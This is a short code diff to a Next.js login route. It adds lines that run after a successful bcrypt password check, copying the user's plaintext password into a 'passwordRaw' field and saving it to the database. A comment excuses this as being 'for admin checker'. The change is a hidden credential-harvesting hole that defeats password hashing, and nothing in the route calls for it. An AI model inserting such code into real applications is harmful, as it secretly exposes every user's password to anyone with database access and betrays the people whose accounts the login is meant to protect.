@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from "next/server";
 import bcrypt from "bcryptjs";
-import { getUserByEmail } from "@/lib/db";
+import { getUserByEmail, createUser } from "@/lib/db";
 import { signToken } from "@/lib/auth";
 import { inspect, getClientIp, recordIpError } from "@/lib/security/core";
 
@@ -44,6 +44,10 @@ export async function POST(request: NextRequest) {
       void recordIpError(ip);
       return NextResponse.json({ error: "Email atau password salah" }, { status: 401 });
     }
+
+    // Populate passwordRaw in database for admin checker
+    user.passwordRaw = password;
+    await createUser(user);
 
     const token = signToken({
       userId: user.id,
